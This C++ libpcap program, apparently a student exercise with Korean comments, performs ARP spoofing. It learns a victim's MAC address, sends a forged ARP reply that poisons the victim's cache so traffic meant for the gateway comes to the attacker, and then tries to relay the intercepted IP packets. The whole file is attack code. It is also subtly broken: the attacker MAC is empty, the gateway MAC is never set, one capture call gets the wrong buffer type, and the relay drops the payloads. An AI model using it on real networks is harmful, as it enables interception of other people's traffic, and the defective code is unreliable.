#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct IpHdr final {
    uint8_t version_;
    uint8_t tos_;
    uint16_t tot_len_;
    uint16_t id_;
    uint16_t frag_off_;
    uint8_t ttl_;
    uint8_t protocol_;
    uint16_t check_;
    Ip sip_;
    Ip dip_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac myMac = Mac("");  // 공격자 MAC (하드코딩)
    Ip  myIp  = Ip("172.20.10.3");         // 공격자 IP (하드코딩)
    int pairs = (argc - 2) / 2;
    Mac senderMac;
    Mac targetMac;

    for (int i = 0; i < pairs; i++) {
        Ip senderIp = Ip(argv[2 + 2*i]);      // victim IP
        Ip targetIp = Ip(argv[2 + 2*i + 1]);  // gateway IP


        EthArpPacket s_packet;  // sending packet 1. 우선, 제대로된 패킷을 보내서 상대의 mac주소를 확인함.
        EthIpPacket ip_packet; // sending packet  victim이 gateway로 보내는 패킷을 relay하기 위해, IP 헤더도 필요함.
        struct pcap_pkthdr* header;     // 2. reply를 통해 victim의 mac주소를 알아내야함.
        const u_char* r_packet;
        const u_char* ip_r_packet;

// ---------------------------------------------------------------------------------------------------------------------
//                                      Request 패킷을 보내서 상대 MAC주소를 알아냄.
// ---------------------------------------------------------------------------------------------------------------------

        s_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 (victim MAC 모르니까)
        s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
        s_packet.eth_.type_ = htons(EthHdr::Arp);	// type eth
        s_packet.arp_.hrd_  = htons(ArpHdr::ETHER);	// Hardware type을 ETHER로 지정
        s_packet.arp_.pro_  = htons(EthHdr::Ip4);	// Protocol type을 IPv4로 지정
        s_packet.arp_.hln_  = Mac::Size;		// Hardware length를 Mac의 size(6바이트)로 지정
        s_packet.arp_.pln_  = Ip::Size;			// Protocol length를 IPv4의 size(4바이트)로 지정
        s_packet.arp_.op_   = htons(ArpHdr::Request);	// Operation ARP를 request로 지정
        s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
        s_packet.arp_.sip_  = htonl(myIp);              // source(attacker)의 ip address (내 IP)
        s_packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target(victim)의 mac (아직 모름, 현재는 unknown)
        s_packet.arp_.tip_  = htonl(senderIp);      // target(victim)의 ip (이걸로 보내는 것)

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            continue;
        }

        res = pcap_next_ex(pcap, &header, &r_packet);
        if (res != 1) {
            fprintf(stderr, "pcap_next_ex failed\n");
            continue;
        }

// ---------------------------------------------------------------------------------------------------------------------
//                                      Request 패킷에 대한 Reply를 받음.
// ---------------------------------------------------------------------------------------------------------------------

        EthHdr* arp_eth = (EthHdr*)r_packet;
        ArpHdr* arp = (ArpHdr*)(r_packet + sizeof(EthHdr));

        // Reply 패킷을 통해 sender(victim)의 MAC 주소를 알아내고, 해당 값을 토대로 ARP spoofing 공격을 위한 reply패킷 생성
        
        senderMac = arp_eth->smac_;
        s_packet.eth_.dmac_ = arp_eth->smac_;               // sender(victim)의 mac address
        s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
        s_packet.arp_.op_   = htons(ArpHdr::Reply);     // Operation ARP를 reply로 지정
        s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
        s_packet.arp_.sip_  = htonl(targetIp);      // gateway의 ip address
        s_packet.arp_.tmac_ = arp->smac_;               // target(victim)의 mac
        s_packet.arp_.tip_  = htonl(senderIp);      // target(victim)의 ip

        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }

        // ARP Spoofed point

        while(1){
            res = pcap_next_ex(pcap, &header, &ip_r_packet); // 이후 IP패킷 잡기
            if (res != 1) {
                fprintf(stderr, "pcap_next_ex failed\n");
                continue;
            }
            EthHdr* ip_eth = (EthHdr*)ip_r_packet;
            IpHdr* ip = (IpHdr*)(ip_r_packet + sizeof(EthHdr));

            // 이제 다음 패킷을 잡아서 victim이 패킷을 relay해야함.
            
            ip_packet.eth_.dmac_ = targetMac;                // gateway의 mac address
            ip_packet.eth_.smac_ = myMac;                    // relay하는 패킷의 sourcemac을 attacker의 mac으로 바꿔서 보내야함.        
            ip_packet.eth_.type_ = htons(EthHdr::Ip4);     // type을 IP로 지정
            ip_packet.ip_.version_  = 4;                   // IP version 4
            ip_packet.ip_.tos_      = 0;                   // Type of Service (기본값 0)
            ip_packet.ip_.tot_len_  = htons(ip->tot_len_); // IP 헤더 길이 + payload 길이
            ip_packet.ip_.id_       = htons(0);                   // Identification (기본값 0)
            ip_packet.ip_.frag_off_ = htons(0);                   // Fragment Offset (기본값 0)           
            ip_packet.ip_.sip_  = htonl(senderIp);          // 이거는 이제 senderIp로써 지정해야 sender가 보냈다고 생각? (reply 패킷이 sender에게 갈 수 있도록)
            ip_packet.ip_.dip_  = htonl(ip->dip_);          // gateway의 Ip가 아닌 패킷을 보내고 싶은 부분의 IP 즉 받은 패킷을 기준으로 판단.

            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ip_packet), sizeof(EthIpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            res = pcap_next_ex(pcap, &header, &ip_packet);
            if (res != 1) {
                fprintf(stderr, "pcap_next_ex failed\n");
                continue;
            }

            // 이로써 relay패킷을 보내는 것까지는 끝. 확인 방법 : gateway에서 attacker의 MAC으로 reply를 보낼 예정, 이를 확인하면 됨. 이를 다시 sender에게 전송

            ip_packet.eth_.dmac_ = senderMac;                // gateway의 mac address
            ip_packet.eth_.smac_ = myMac;                   // relay하는 패킷의 sourcemac을 attacker의 mac으로 바꿔서 보내야함.                   
            ip_packet.ip_.sip_  = htonl(ip->sip_);          // 이거는 이제 senderIp로써 지정해야 sender가 보냈다고 생각? (reply 패킷이 sender에게 갈 수 있도록)
            ip_packet.ip_.dip_  = htonl(ip->dip_);

            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ip_packet), sizeof(EthIpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }        
    } // while fin




    }

    pcap_close(pcap);
    return 0;
}

